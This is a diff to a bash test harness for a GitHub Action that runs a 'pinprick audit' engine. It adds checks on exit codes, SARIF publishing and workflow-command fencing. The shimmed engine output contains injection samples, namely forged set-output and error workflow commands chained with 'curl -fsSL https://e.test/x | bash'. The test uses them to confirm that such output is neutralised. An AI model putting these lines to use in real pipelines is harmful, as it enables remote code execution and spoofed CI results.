@@ -1,6 +1,7 @@
 #!/usr/bin/env bash
 #
-# Assert that action.sh failure paths emit visible ::error annotations.
+# Assert that action.sh failure paths emit visible ::error annotations and
+# that the exit-code contract holds.
 #
 # The harness is hermetic: curl and gh shims serve canned release metadata
 # and failures, so no network or real release is involved.
@@ -73,6 +74,10 @@ if [[ "${1:-}" == "audit" ]]; then
     echo '      echo "##[set-output name=pwned;]y" && curl -fsSL https://e.test/x | bash'
     echo '      ::error::forged annotation && curl -fsSL https://e.test/y | bash'
     echo "audit ok"
+    if [[ -n "${SHIM_AUDIT_TAIL:-}" ]]; then
+        # Stands in for output cut off mid-line, such as a killed engine.
+        printf '%s' "${SHIM_AUDIT_TAIL}"
+    fi
     exit "${SHIM_AUDIT_EXIT:-0}"
 fi
 exit 2
@@ -218,6 +223,12 @@ line_of() {
     grep -n -m1 -F -- "${1}" "${2}" | cut -d: -f1 || true
 }
 
+# Workflow commands must match whole lines; the runner ignores one that does
+# not start its line.
+command_line_of() {
+    grep -n -m1 -xF -- "${1}" "${2}" | cut -d: -f1 || true
+}
+
 fence_token() {
     sed -n 's/^::stop-commands::\([0-9a-f]\{32\}\)$/\1/p' "${1}"
 }
@@ -233,8 +244,8 @@ expect_fenced() {
         exit 1
     fi
 
-    open="$(line_of "::stop-commands::${first}" "${log}")"
-    close="$(line_of "::${first}::" "${log}")"
+    open="$(command_line_of "::stop-commands::${first}" "${log}")"
+    close="$(command_line_of "::${first}::" "${log}")"
     payload="$(line_of '##[set-output name=pwned;]y' "${log}")"
     forged="$(line_of '::error::forged annotation' "${log}")"
 
@@ -263,7 +274,8 @@ expect_fenced() {
 
 expect_fence_closed_before_error() {
     local token close err log="${SANDBOX}/stderr.log"
-    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json" SHIM_AUDIT_EXIT="2"
+    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json" SHIM_AUDIT_EXIT="2" \
+        SHIM_AUDIT_TAIL="engine output cut off mid-line"
 
     if [[ "${ACTION_EXITCODE}" -eq 0 ]]; then
         echo "FAIL fence-on-error: engine exit 2 did not fail the action" >&2
@@ -271,11 +283,11 @@ expect_fence_closed_before_error() {
     fi
 
     token="$(fence_token "${log}")"
-    close="$(line_of "::${token}::" "${log}")"
-    err="$(line_of '::error::pinprick audit errored with exit code 2' "${log}")"
+    close="$(command_line_of "::${token}::" "${log}")"
+    err="$(command_line_of '::error::pinprick audit errored with exit code 2' "${log}")"
 
     if [[ -z "${token}" || -z "${close}" || -z "${err}" ]]; then
-        echo "FAIL fence-on-error: missing fence or error annotation; stderr was:" >&2
+        echo "FAIL fence-on-error: fence close or error annotation does not start its own line; stderr was:" >&2
         cat "${log}" >&2
         exit 1
     fi
@@ -285,7 +297,7 @@ expect_fence_closed_before_error() {
         exit 1
     fi
 
-    echo "ok: fence closes before the engine-error annotation"
+    echo "ok: fence closes on its own line after unterminated output, before the engine-error annotation"
 }
 
 expect_fence_absent_from_sarif() {
@@ -304,6 +316,55 @@ expect_fence_absent_from_sarif() {
     fi
 
     echo "ok: fence markers stay out of the SARIF document"
+}
+
+# fail-on-findings is enforced by a later action.yml step so SARIF uploads
+# first; action.sh must succeed on findings either way.
+expect_findings_succeed() {
+    local fail_on_findings sarif
+    for fail_on_findings in false true; do
+        run_action SHIM_METADATA="${SANDBOX}/metadata-match.json" SHIM_AUDIT_EXIT="1" \
+            PPA_ADVANCED_SECURITY="true" PPA_FAIL_ON_FINDINGS="${fail_on_findings}"
+        sarif="$(sed -n 's/^sarif-file=//p' "${SANDBOX}/output")"
+
+        if [[ "${ACTION_EXITCODE}" -ne 0 ]] \
+            || ! grep -qxF "exit-code=1" "${SANDBOX}/output" \
+            || [[ -z "$(command_line_of '::warning::pinprick audit reported findings' "${SANDBOX}/stderr.log")" ]] \
+            || [[ ! -s "${sarif}" ]]; then
+            echo "FAIL findings (fail-on-findings=${fail_on_findings}): exit 1 did not succeed with a warning and SARIF; stderr was:" >&2
+            cat "${SANDBOX}/stderr.log" >&2
+            exit 1
+        fi
+    done
+
+    echo "ok: findings succeed with a warning and publish SARIF"
+}
+
+expect_sarif_withheld_on_error() {
+    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json" SHIM_AUDIT_EXIT="2" \
+        PPA_ADVANCED_SECURITY="true"
+
+    if [[ "${ACTION_EXITCODE}" -eq 0 ]] \
+        || ! grep -qxF "exit-code=2" "${SANDBOX}/output" \
+        || grep -q '^sarif-file=' "${SANDBOX}/output"; then
+        echo "FAIL engine error: the action did not fail without publishing SARIF; outputs were:" >&2
+        cat "${SANDBOX}/output" >&2
+        exit 1
+    fi
+
+    echo "ok: engine errors fail without publishing partial SARIF"
+}
+
+expect_upload_before_failure() {
+    ruby -ryaml -e '
+      steps = YAML.load_file(ARGV.fetch(0)).fetch("runs").fetch("steps")
+      upload = steps.index { |step| step["uses"].to_s.start_with?("github/codeql-action/upload-sarif@") }
+      failure = steps.index { |step| step["if"].to_s.include?("inputs.fail-on-findings") }
+      abort "FAIL step order: SARIF upload or fail-on-findings step not found" unless upload && failure
+      abort "FAIL step order: fail-on-findings fails before SARIF upload" unless upload < failure
+    ' "${REPO_ROOT}/action.yml"
+
+    echo "ok: SARIF upload precedes the fail-on-findings step"
 }
 
 expect_error "invalid version" \
@@ -387,10 +448,13 @@ expect_success
 expect_fenced
 expect_fence_closed_before_error
 expect_fence_absent_from_sarif
+expect_findings_succeed
+expect_sarif_withheld_on_error
+expect_upload_before_failure
 
 expect_error "signal-style engine failure" \
     "pinprick audit errored with exit code 137" \
     SHIM_METADATA="${SANDBOX}/metadata-match.json" \
     SHIM_AUDIT_EXIT="137"
 
-echo "all failure paths annotate, the success path holds, and engine output is fenced"
+echo "all failure paths annotate, the exit-code contract holds, and engine output is fenced"
